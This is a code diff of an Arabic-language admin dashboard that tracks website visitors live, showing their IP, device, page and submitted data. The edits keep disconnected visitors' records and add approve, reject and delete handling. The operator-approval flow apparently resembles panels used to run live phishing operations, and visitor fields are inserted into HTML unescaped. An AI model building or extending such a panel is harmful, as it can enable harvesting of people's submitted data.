@@ -22,6 +22,7 @@
       50% { background-color: #fde68a; }
     }
     .data-section { border-right: 4px solid #3b82f6; }
+    .disconnected { opacity: 0.6; }
   </style>
 </head>
 <body class="bg-gray-100 min-h-screen">
@@ -106,7 +107,7 @@
       const password = document.getElementById('password').value;
       
       socket = io(SOCKET_URL, {
-        transports: ['websocket'],
+        transports: ['websocket', 'polling'],
       });
 
       socket.on('connect', () => {
@@ -127,32 +128,31 @@
     // Setup socket listeners
     function setupSocketListeners() {
       socket.on('visitors:list', (list) => {
-        list.forEach(v => visitors.set(v.socketId, v));
+        // Store all visitors by their _id (not socketId) to preserve data
+        list.forEach(v => visitors.set(v._id, v));
         renderVisitorsList();
       });
 
       socket.on('visitor:new', (visitor) => {
-        visitors.set(visitor.socketId, visitor);
+        visitors.set(visitor._id, visitor);
         renderVisitorsList();
         showNotification(`زائر جديد: ${visitor.visitorNumber}`);
       });
 
       socket.on('visitor:pageChanged', ({ visitorId, page }) => {
-        visitors.forEach((v, sid) => {
-          if (v._id === visitorId) {
-            v.page = page;
-            visitors.set(sid, v);
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.page = page;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(visitor);
           }
-        });
-        renderVisitorsList();
-        if (selectedVisitorId) {
-          const selected = Array.from(visitors.values()).find(v => v._id === selectedVisitorId);
-          if (selected) renderVisitorDetails(selected);
         }
       });
 
       socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
-        visitors.set(visitor.socketId, visitor);
+        visitors.set(visitorId, visitor);
         renderVisitorsList();
         if (selectedVisitorId === visitorId) {
           renderVisitorDetails(visitor);
@@ -160,9 +160,17 @@
         showNotification(`بيانات جديدة من الزائر ${visitor.visitorNumber}`);
       });
 
-      socket.on('visitor:disconnected', ({ socketId }) => {
-        visitors.delete(socketId);
-        renderVisitorsList();
+      socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
+        // Don't delete visitor, just mark as disconnected
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.isConnected = false;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(visitor);
+          }
+        }
       });
     }
 
@@ -177,16 +185,20 @@
       }
 
       visitorsList.innerHTML = list.map(v => `
-        <div class="visitor-card p-4 rounded-lg border cursor-pointer ${selectedVisitorId === v._id ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300'}" onclick="selectVisitor('${v._id}')">
+        <div class="visitor-card p-4 rounded-lg border cursor-pointer ${selectedVisitorId === v._id ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300'} ${v.isConnected === false ? 'disconnected' : ''}" onclick="selectVisitor('${v._id}')">
           <div class="flex justify-between items-start mb-2">
             <span class="font-bold">#${v.visitorNumber}</span>
-            <span class="text-xs px-2 py-1 rounded-full ${v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600'}">${v.page}</span>
+            <div class="flex items-center gap-2">
+              ${v.isConnected === false ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="غير متصل"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="متصل"></span>'}
+              <span class="text-xs px-2 py-1 rounded-full ${v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600'}">${v.page}</span>
+            </div>
           </div>
           <div class="text-sm text-gray-500">
             <p>${v.ip}</p>
             <p>${v.device} - ${v.browser}</p>
           </div>
           ${v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">⏳ ينتظر الرد</div>' : ''}
+          ${Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات</div>' : ''}
         </div>
       `).join('');
     }
@@ -194,7 +206,7 @@
     // Select visitor
     function selectVisitor(visitorId) {
       selectedVisitorId = visitorId;
-      const visitor = Array.from(visitors.values()).find(v => v._id === visitorId);
+      const visitor = visitors.get(visitorId);
       if (visitor) {
         renderVisitorDetails(visitor);
         renderVisitorsList();
@@ -227,14 +239,17 @@
             <div>
               <h2 class="text-2xl font-bold">زائر #${visitor.visitorNumber}</h2>
               <p class="text-gray-500">${visitor.page}</p>
-              ${visitor.waitingForAdminResponse ? '<span class="inline-block mt-2 px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">⏳ ينتظر الرد</span>' : ''}
+              <div class="flex items-center gap-2 mt-2">
+                ${visitor.isConnected === false ? '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">🔴 غير متصل</span>' : '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">🟢 متصل</span>'}
+                ${visitor.waitingForAdminResponse ? '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">⏳ ينتظر الرد</span>' : ''}
+              </div>
             </div>
             <div class="flex gap-2">
-              <button onclick="approveForm('${visitor.socketId}')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2">
+              <button onclick="approveForm('${visitor.socketId}')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2" ${visitor.isConnected === false ? 'disabled class="opacity-50 cursor-not-allowed"' : ''}>
                 <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
                 موافقة
               </button>
-              <button onclick="rejectForm('${visitor.socketId}')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2">
+              <button onclick="rejectForm('${visitor.socketId}')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2" ${visitor.isConnected === false ? 'disabled class="opacity-50 cursor-not-allowed"' : ''}>
                 <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
                 رفض
               </button>
@@ -392,7 +407,7 @@
             </div>
             <div class="mt-4 flex gap-2">
               <button onclick="blockVisitor('${visitor.socketId}')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg hover:bg-red-200">حظر</button>
-              <button onclick="deleteVisitor('${visitor.socketId}')" class="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200">حذف</button>
+              <button onclick="deleteVisitor('${visitor._id}')" class="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200">حذف</button>
             </div>
           </div>
         </div>
@@ -437,10 +452,12 @@
       }
     }
 
-    function deleteVisitor(socketId) {
+    function deleteVisitor(visitorId) {
       if (confirm('هل أنت متأكد من حذف هذا الزائر؟')) {
-        socket.emit('admin:delete', socketId);
+        socket.emit('admin:deleteById', visitorId);
+        visitors.delete(visitorId);
         selectedVisitorId = null;
+        renderVisitorsList();
         visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><p>اختر زائر لعرض التفاصيل</p></div>';
       }
     }
